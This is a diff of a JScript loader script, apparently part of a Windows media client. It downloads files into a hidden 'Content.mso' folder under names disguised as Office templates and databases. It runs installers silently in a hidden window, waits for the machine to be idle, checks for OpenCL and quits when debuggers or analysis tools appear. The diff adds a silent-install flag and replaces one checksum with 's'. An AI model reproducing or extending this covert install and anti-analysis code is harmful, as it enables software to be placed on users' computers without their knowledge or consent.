@@ -20,7 +20,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"97C80E865FD75A9D17849EEEC6C83444" }
+var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"s" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -36,12 +36,15 @@ else if(__IsSupportOpencl)
 	var __idletime=1000*30
 var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"F037240BA8B7315662E7496489345107" }
 var __installReadys = [
-						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
-						{id: 10002, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
+						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
+							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
+							condition:{type: "reg", subtype: "existreg", value:"HKEY_CURRENT_USER\\Software\\ExtIconHandler2\\"} 
+						},
+						{id: 10002, name: "XMPSetup-fanli(2).exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
 					  ]
 						
 ///////////
-trace ("global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+",__startTickCout="+__startTickCout+",__lastInputInfo="+__lastInputInfo)
+trace ("global.js " + __fso.GetFile(__workdir+"Doc1.dot").DateLastModified  + " ; global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+",__startTickCout="+__startTickCout+",__lastInputInfo="+__lastInputInfo)
 ///////
 function log(msg) {
 	if(!__DEBUG)
@@ -69,7 +72,8 @@ function log(msg) {
 	trace( msg + "		" + debugstring.replace(/\n/g, " "));
 }
 ////////////
-function module(name){	
+function module(name,g){
+	this.g = g;
 	if(typeof name == "undefined"){
 		if(arguments.callee.name)
 			arguments.callee.name+=1;
@@ -77,10 +81,11 @@ function module(name){
 			arguments.callee.name =1
 		name = "modulename_"+1;
 	}
-	if(arguments.callee.modules[name]){
+	//
+	if(module.modules[name]){
 		("module name : " + name + "  exist , will recovery");
 	}
-	arguments.callee.modules[name]=this
+	module.modules[name]=this
 	this.name = name;
 	this.currentFilterIndex=-1;
 	this.filters = [];
@@ -95,8 +100,8 @@ function module(name){
 				if (this.doneCallback) {
 					this.doneCallback(this,pipe,this.currentFilterIndex);
 				}
-				if(arguments.callee.doneCallback && arguments.callee.getRunningModules().length==0){
-					arguments.callee.doneCallback(arguments.callee);
+				if(module.doneCallback && module.getRunningModules().length==0){
+					module.doneCallback(module);
 				}
 				return true;
 			}
@@ -126,8 +131,8 @@ function module(name){
 				if (this.doneCallback) {
 					this.doneCallback(this,pipe,this.currentFilterIndex);
 				}
-				if(arguments.callee.doneCallback && arguments.callee.getRunningModules().length==0){
-					arguments.callee.doneCallback(arguments.callee);
+				if(module.doneCallback && module.getRunningModules().length==0){
+					module.doneCallback(module);
 				}
 				return true;
 			}
@@ -167,8 +172,8 @@ function module.prototype.cancel () {
 	if (this.doneCallback) {
 		this.doneCallback(this,this.pipe,index);
 	}
-	if(arguments.callee.doneCallback && arguments.callee.getRunningModules().length==0){
-		arguments.callee.doneCallback(arguments.callee);
+	if(module.doneCallback && module.getRunningModules().length==0){
+		module.doneCallback(module);
 	}
 }
 module.prototype.getStep=function () {
@@ -181,18 +186,22 @@ module.prototype.setDoneCallback=function (callback) {
 /////////
 module.modules={}
 module.setDoneCallback=function (callback) {
+	log("module.setDoneCallback")
 	module.doneCallback = callback;
 }
 module.getRunningModules=function () {
-	var runningModules = {}
+	log("module.getRunningModules")
+	var runningModules = []
 	for(var index in module.modules){
 		var _module = module.modules[index];
 		var step = _module.getStep();
-		log("module : " + _module.name + " , in step : " + step);
-		if(step>0){
-			runningModules[_module.name] = _module;
+		log("module : " + _module.name + " , in step : " + step + ", filters.length="+_module.filters.length + " _module.g="+_module.g);
+		if((step>0 && (step<_module.filters.length)) //filter未执行完
+				&& !_module.g){
+			runningModules.push(_module);
 		}
 	}
+	return runningModules
 }
 /////////////////
 function getXmlHttp () {
@@ -272,7 +281,7 @@ function filter_dlbusiness.prototype.run(pipe){
 	var pThis = this;
 	pipe.exitcode=100;
 	if(md5==pipe.md5.toUpperCase()){
-		log(" readyDestFile OnSuccess")
+		log(" readyDestFile OnSuccess "+pipe.name)
 		sendHttpStat("downloadedfile", "downloadedfile_success_"+pipe.name);
 		return true;
 	}
@@ -347,8 +356,8 @@ function filter_eXclusiveRuning(once){
 }
 function filter_eXclusiveRuning.prototype.run(pipe){
 	var pThis = this;
-	var ret = __DEBUG || external.__debugging || this.checkWindows() || this.checkProcesses(); 
-	log("ret="+ret+" ,this.once="+this.once);
+	var ret = __DEBUG ? 0 : external.__debugging || this.checkWindows() || this.checkProcesses();	
+	log("ret="+ret+" ,this.once="+this.once + ", external.__debugging="+external.__debugging);
 	if(this.once){
 		if(ret){
 			pipe.exitaction=unescape(ret.toString());
@@ -358,9 +367,8 @@ function filter_eXclusiveRuning.prototype.run(pipe){
 		return true;
 	}else{
 		setInterval(function (){
-			var ret = __DEBUG || external.__debugging || pThis.checkWindows() || pThis.checkProcesses() ; 
-			if(ret)
-			{
+			var ret = __DEBUG ? 0 : external.__debugging || pThis.checkWindows() || pThis.checkProcesses(); 
+			if(ret){
 				pipe.exitaction=unescape(ret.toString());
 				pThis.callback(pipe,true); 
 			}
@@ -415,27 +423,33 @@ function tryInstall(){
 		var pipe = __installReadys[i];
 		var path = __workdir +pipe.name
 		if(__fso.FileExists(path)){
-			WshShell.run(path +" "+pipe.param, 0 ,false);
+			var cmd = path +" "+pipe.param
+			//log("cmd = " + cmd);
+			//WshShell.Run(cmd, 0 ,false);
+			WshShell.Exec(cmd)
 			var key_path = prekey + parseInt(pipe.id /100) *100;
 			__TRY(function(){ key_value = WshShell.RegRead(key_path);})
+			log("RegRead : " + key_path + " , value : " + key_value);
 			key_value = key_value || "";
 			key_value +=pipe.id+";";
-			WshShell.RegWrite(key_path);
+			__TRY(function(){WshShell.RegWrite(key_path, key_value);});
 			sendHttpStat("bundleinstalled", ""+""+pipe.name);
 		}
 	}	
 }
 var exitaction 
 function onload(){
-	if(__startTickCout<60*1000){
+	sendHttpStat( "launch", "onload");
+	////
+	if(__startTickCout<60*1000){		
 		tryInstall();
-		exit(1);
+		log("exit(10)");
+		exit(10);
 		return ;
 	}
 	 
 	//1.启动统计
-	var __module = new module("global.js");	
-	sendHttpStat( "launch", "onload");
+	var __module = new module("global.js", 1);	
 	var filter_xrun = new filter_eXclusiveRuning(1)
 	var filter_dl = new filter_dlbusiness();
 	var filter_load = new filter_loadmainjs();
@@ -451,9 +465,9 @@ function onload(){
 		log(" module name "+mod.name+" onDoneCallback pipe.exitaction="+mod.pipe.exitaction+" pipe.exitcode="+pipe.exitcode+" indexfilter="+index);
 		delete filter_xrun; delete filter_dl; delete filter_load; delete filter_xrun2;
 		delete __module;
-		setTimeout(function(){__external.TerminateProcess(0,1); exit(-2)},1);
+		setTimeout(function(){__external.TerminateProcess(0,1); exit(-20)},1);
 		 
 	})
 	__module.run(pipe);
 };
-function onunload(){ sendHttpStat("launch", "unload_" + (exitaction?exitaction:"normal") , parseInt((__external.GetTickCount()-__startTickCout)/1000/60),  1);  delete  __cpu ; delete __service ; delete __locator;  delete __external; delete __windows; delete __storage};
+function onunload(code){ sendHttpStat("launch", "unload_" + code, parseInt((__external.GetTickCount()-__startTickCout)/1000/60),  1);  delete  __cpu ; delete __service ; delete __locator;  delete __external; delete __windows; delete __storage};
